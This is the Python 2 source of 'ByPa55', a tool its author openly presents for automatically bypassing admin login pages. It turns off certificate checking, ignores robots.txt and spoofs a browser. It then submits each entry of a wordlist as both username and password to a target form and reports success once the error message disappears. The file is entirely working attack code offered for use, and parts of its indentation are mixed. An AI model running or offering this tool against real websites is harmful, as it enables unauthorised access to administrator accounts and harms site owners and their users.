#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# ========== ByPa55 ============

# author      : siruidops
# email       : sir.u1d0p5@gmail.com
# github      : https://github.com/siruidops/bypa55
# description : a tool for auto by passing login page admin and ...

# ==============================
# Telegram: @softhacking
# 

import sys,os,urllib,ssl
from c0l0r import *

try:
	import mechanize
except:
	print
	print " [-] Please install mechanize library"
	print "     e.x: pip install mechanize"
	print
	sys.exit()

class ByPass(object):
	def main(self):
		pass
	def run(slef,url,user_field,pass_field,error,metod):
		print
		print yellow+" ####### "+green+"ByPa55"+yellow+" #######"
		print
		print brown+"   URL"+end+":"+green+" %s"%(url)
		print brown+"   User_field"+end+":"+green+" %s"%(user_field)
		print brown+"   Pass_field"+end+":"+green+" %s"%(pass_field)
		print brown+"   Method"+end+":"+green+" %s"%(metod)
		print brown+"   Error"+end+":"+green+" %s%s"%(error,end)
		print
		r = raw_input(brown+"ByPa55 > Submit [Y]es, [n]o >>> "+end)
		if r=="Y" or r=="y" or r=="":
			pass
		else:
			sys.exit(red+" [-] Good Bye (^/^)"+end)
		try:
			u = urllib.urlopen(url)
			if u.code == 200:
				pass
			else:
				print
				print red+" [-] Not Found Your WebPage"+end
				print
				sys.exit()
		except:
			print
			print red+" [-] Not Found Your WebSite"+end
			print
			sys.exit()
		file = open("core/words.txt")
		words = file.readlines()
		file.close()

		# -*- SSL Certified -*-
		try:
   		 _create_unverified_https_context = ssl._create_unverified_context
		except AttributeError:
    		# Legacy Python that doesn't verify HTTPS certificates by default
   		 pass
		else:
    		# Handle target environment that doesn't support HTTPS verification
   		 ssl._create_default_https_context = _create_unverified_https_context
    
		for word in words:
			word = word.strip()
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent","Firefox")]
			br.open(url)
			br.select_form(method=metod)
			br[user_field] = word
			br[pass_field] = word
			res = br.submit()
			if error in res.read():
				print red+" Try"+end+": "+green+word+end
			else:
				print
				print brown+" Success"+end+": "+green+word+end
				print
				sys.exit()


